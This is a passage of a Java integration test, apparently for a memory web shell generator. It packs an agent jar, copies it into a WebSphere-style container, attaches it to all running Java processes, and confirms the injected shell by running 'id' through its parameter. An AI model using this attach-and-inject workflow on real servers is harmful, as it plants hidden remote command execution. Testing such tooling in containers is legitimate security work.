                shellType, shellTool, config.getTargetJdkVersion(), shellToolConfig, packer);

        // Pack and copy to container
        byte[] bytes = ((JarPacker) PackerRegistry.getInstance().get(packer)).packBytes(JarPackerConfig.from(generateResult));
        Path tempJar = Files.createTempFile("temp", "jar");
        Files.write(tempJar, bytes);
        String jarPath = "/listProcessTest.jar";
        appContainer.copyFileToContainer(MountableFile.forHostPath(tempJar, 0100666), jarPath);
        Files.deleteIfExists(tempJar);

        // Test 1: List processes (no args)
        Container.ExecResult listResult = appContainer.execInContainer("java", "-jar", jarPath);
        String listStdout = listResult.getStdout();
        if (listStdout.contains("executable file not found")) {
            listResult = appContainer.execInContainer("/opt/IBM/WebSphere/AppServer/java/bin/java", "-jar", jarPath);
            listStdout = listResult.getStdout();
            if (listStdout.contains("no such file or directory")) {
                listResult = appContainer.execInContainer("/opt/IBM/WebSphere/AppServer/java/8.0/jre/bin/java", "-jar", jarPath);
                listStdout = listResult.getStdout();
            }
        }
        log.info("list processes output:\n{}", listStdout);
        System.out.println("list stderr: " + listResult.getStderr());
        assertThat("Should find at least one Java process", listStdout.trim(), not(equalTo("")));
        assertThat("Should find Java processes", listStdout, not(containsString("No Java processes found")));

        // Test 2: Attach all
        Container.ExecResult attachResult = appContainer.execInContainer("java", "-jar", jarPath, "all");
        String attachStdout = attachResult.getStdout();
        if (attachStdout.contains("executable file not found")) {
            attachResult = appContainer.execInContainer("/opt/IBM/WebSphere/AppServer/java/bin/java", "-jar", jarPath, "all");
            attachStdout = attachResult.getStdout();
            if (attachStdout.contains("no such file or directory")) {
                attachResult = appContainer.execInContainer("/opt/IBM/WebSphere/AppServer/java/8.0/jre/bin/java", "-jar", jarPath, "all");
                attachStdout = attachResult.getStdout();
            }
        }
        log.info("attach all output:\n{}", attachStdout);
        System.out.println("attach all stderr: " + attachResult.getStderr());
        assertThat("Attach all should complete with Success", attachStdout, containsString("Success"));

        // Test 3: Verify shell injection was successful
        String paramName = ((CommandConfig) shellToolConfig).getParamName();
        commandIsOk(shellUrl, shellType, paramName, "id");
    }
}
